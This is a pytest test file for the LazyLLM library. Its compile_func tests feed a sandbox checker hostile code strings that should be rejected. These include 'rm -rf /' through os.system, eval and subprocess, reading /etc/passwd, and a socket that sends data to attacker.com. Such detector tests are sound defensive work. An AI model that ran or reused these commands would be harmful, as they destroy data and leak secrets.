import random
import time
import pytest
import threading

import lazyllm
from lazyllm.common import ArgsDict, compile_func
from lazyllm.common import once_wrapper
from lazyllm.components.formatter import lazyllm_merge_query, encode_query_with_filepaths, decode_query_with_filepaths


class TestCommon(object):

    def test_common_argsdict(self):

        my_ob = ArgsDict({'a': '1', 'b': '2'})
        my_ob.check_and_update(my_ob)
        expected_output = '--a="1" --b="2"'
        assert my_ob.parse_kwargs() == expected_output

    def test_common_bind(self):

        def exam(a, b, c):
            return [a, b, c]

        num_list = [random.randint(1, 10) for _ in range(3)]
        r1 = lazyllm.bind(exam, num_list[0], lazyllm._0, num_list[2])
        ret_list = r1(num_list[1])
        assert ret_list == num_list

    def test_encode_and_decode_and_merge_query_with_filepaths(self):
        # Test encode
        query = 'hi'
        path_list = ['a', 'b']
        encode = encode_query_with_filepaths(query, path_list)
        assert encode == '<lazyllm-query>{"query": "hi", "files": ["a", "b"]}'
        assert encode_query_with_filepaths(query) == 'hi'

        # Test decode
        decode = decode_query_with_filepaths(encode)
        assert isinstance(decode, dict)
        assert 'query' in decode and 'files' in decode
        assert decode['query'] == query
        assert decode['files'] == path_list
        assert decode_query_with_filepaths(query) == query

        # Test Merge
        assert lazyllm_merge_query(query) == query
        assert lazyllm_merge_query(query, query, query) == query * 3
        assert lazyllm_merge_query(query, encode) == '<lazyllm-query>{"query": "hihi", "files": ["a", "b"]}'
        assert lazyllm_merge_query(encode, encode) == ('<lazyllm-query>{"query": "hihi", "files": '
                                                       '["a", "b", "a", "b"]}')
        assert lazyllm_merge_query(encode, query, query) == ('<lazyllm-query>{"query": "hihihi", '
                                                             '"files": ["a", "b"]}')

    def test_common_cmd(self):

        ret = lazyllm.LazyLLMCMD('python a --a=b --c=d', no_displays=['a'])
        assert str(ret) == 'python a  --c=d'

        ret = lazyllm.LazyLLMCMD('python a --a=b --c=d', no_displays=['c'])
        assert str(ret) == 'python a --a=b '

        ret = lazyllm.LazyLLMCMD('python a --a=b --c=d', no_displays=['d'])
        assert str(ret) == 'python a --a=b --c=d'

    def test_common_timeout(self):
        from lazyllm.common.common import TimeoutException

        with pytest.raises(TimeoutException):
            with lazyllm.timeout(1, msg='hello'):
                time.sleep(2)

    def test_common_tread(self):

        def is_equal2(x):
            if x == 2:
                return x
            else:
                raise Exception

        ts = [lazyllm.Thread(target=is_equal2, args=(inp, )) for inp in [2, 3]]
        [t.start() for t in ts]

        assert ts[0].get_result() == 2
        with pytest.raises(Exception):
            ts[1].get_result()

    def test_common_makerepr(self):

        r1 = lazyllm.make_repr('a', 1)
        r2 = lazyllm.make_repr('b', 2)
        assert lazyllm.make_repr('c', 3, subs=[r1, r2]) == '<c type=3>'

        with lazyllm.config.temp('repr_show_child', True):
            assert lazyllm.make_repr('c', 3, subs=[r1, r2]) == '<c type=3>\n |- <a type=1>\n └- <b type=2>\n'

        assert lazyllm.make_repr('c', 3, subs=[r1, r2]) == '<c type=3>'

    def test_compile_func(self):
        str1 = "def identity(v): return v"
        identity = compile_func(str1)
        assert identity("abc") == "abc"
        assert identity(12345) == 12345

        str2 = "def square(v): return v * v"
        square = compile_func(str2)
        assert square(3) == 9
        assert square(18) == 324

    def test_compile_func_dangerous_code(self):
        func1 = """def use_exec():\n    exec('print("This is unsafe")')"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: exec"):
            compile_func(func1)

        func2 = """def del_file():\n    eval("__import__('os').system('rm -rf /')")"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: eval"):
            compile_func(func2)

        func3 = """def read_file():\n    open("/etc/passwd", "r").read()"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: open"):
            compile_func(func3)

        func4 = ("""def comiple_function():\n    code = compile("os.system('rm -rf /')", """
                 """"<string>", "exec")\n    exec(code)""")
        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: compile"):
            compile_func(func4)

        func5 = """def get_attr():\n    getattr(__builtins__, "eval")("os.system('rm -rf /')")"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: getattr"):
            compile_func(func5)

    def test_compile_func_dangerous_os_operation(self):
        func1 = """import os\ndef use_system():\n    os.system("rm -rf /")"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous os call: os.system"):
            compile_func(func1)

        func2 = """import os\ndef use_popen():\n    os.popen("cat /etc/passwd").read()"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous os call: os.popen"):
            compile_func(func2)

    def test_compile_func_dangerous_sys_operation(self):
        func1 = """import sys\ndef use_exit():\n    sys.exit(1)\n"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous sys call: sys.exit"):
            compile_func(func1)

    def test_compile_func_dangerous_import(self):
        func1 = ("""import pickle\ndef load_cmd():\n    """
                 """malicious_data = pickle.dumps({"command": lambda: __import__("os").system("rm -rf /")})\n"""
                 """    pickle.loads(malicious_data)""")
        with pytest.raises(ValueError, match="⚠️ Detected dangerous module import: pickle"):
            compile_func(func1)

        func2 = """import subprocess\ndef del_all():\n    subprocess.run("rm -rf /", shell=True)"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous module import: subprocess"):
            compile_func(func2)

        func3 = ("""import socket\ndef send_data():\n    s = socket.socket()\n    s.connect(("attacker.com", 80))\n"""
                 """    s.send(b"Sensitive data")""")
        with pytest.raises(ValueError, match="⚠️ Detected dangerous module import: socket"):
            compile_func(func3)

        func4 = """from shutil import rmtree\ndef del_file():\n    rmtree("important_file.txt")"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous module import: shutil"):
            compile_func(func4)

    def test_compile_func_dangerous_attr(self):
        func1 = """import os\ndef set_path():\n    os.environ['PATH'] = '/malicious/path'"""
        with pytest.raises(ValueError, match="⚠️ Detected dangerous access: os.environ"):
            compile_func(func1)


class TestCommonOnce(object):

    @once_wrapper
    def once_func(self):
        self._count += 1

    @once_wrapper
    def once_func_with_exception(self):
        self._count += 1
        raise RuntimeError('once exception')

    def test_callonce(self):
        self._count = 0
        assert not self.once_func.flag
        self.once_func()
        assert self._count == 1
        assert self.once_func.flag
        self.once_func()
        assert self._count == 1

    def test_callonce_exception(self):
        self._count = 0
        assert not self.once_func_with_exception.flag
        with pytest.raises(RuntimeError, match='once exception'):
            self.once_func_with_exception()
        assert self._count == 1
        assert self.once_func_with_exception.flag
        with pytest.raises(RuntimeError, match='once exception'):
            self.once_func_with_exception()
        assert self._count == 1


class TestCommonGlobals(object):

    def _lazyllm_worker(self):
        assert lazyllm.globals['a'] == 1
        assert lazyllm.globals['chat_history'] == {}
        assert lazyllm.globals['global_parameters']['key'] == 'value'

    def _normal_worker(self):
        assert 'a' not in lazyllm.globals
        assert lazyllm.globals._sid == f'tid-{hex(threading.get_ident())}'
        assert lazyllm.globals['chat_history'] == {}
        assert lazyllm.globals['global_parameters'] == {}

    def test_globals(self):
        assert lazyllm.globals._sid == f'tid-{hex(threading.get_ident())}'
        assert lazyllm.globals['chat_history'] == {}
        assert lazyllm.globals['global_parameters'] == {}
        lazyllm.globals['global_parameters']['key'] = 'value'
        t = lazyllm.Thread(target=self._lazyllm_worker)
        t.start()
        t.join()
        t = threading.Thread(target=self._normal_worker)
        t.start()
        t.join()


class TestCommonRegistry(object):
    def test_component_registry(self):
        lazyllm.component_register.new_group('mygroup')

        @lazyllm.component_register('mygroup')
        def myfunc(input):
            return input

        assert lazyllm.mygroup.myfunc()(1) == 1
        assert lazyllm.mygroup.myfunc(launcher=lazyllm.launchers.empty)(1) == 1

        lazyllm.mygroup.remove('myfunc')
        with pytest.raises(AttributeError):
            lazyllm.mygroup.myfunc()(1)

        @lazyllm.component_register('mygroup.subgroup')
        def myfunc2(input):
            return input

        assert lazyllm.mygroup.subgroup.myfunc2()(1) == 1
        assert lazyllm.mygroup.subgroup.myfunc2(launcher=lazyllm.launchers.empty)(1) == 1

    def test_custom_registry(self):
        class CustomClass(object, metaclass=lazyllm.common.registry.LazyLLMRegisterMetaClass):
            def __call__(self, a, b):
                return self.forward(a + 1, b * 2)

            def forward(self, a, b):
                raise NotImplementedError('forward is not implemented')

        reg = lazyllm.Register(CustomClass, 'forward')
        reg.new_group('custom')

        @reg('custom')
        def test(a, b): return a + b

        @reg.forward('custom')
        def test2(a, b): return a * b

        assert lazyllm.custom.test()(1, 2) == 6
        assert lazyllm.custom.test2()(1, 2) == 8
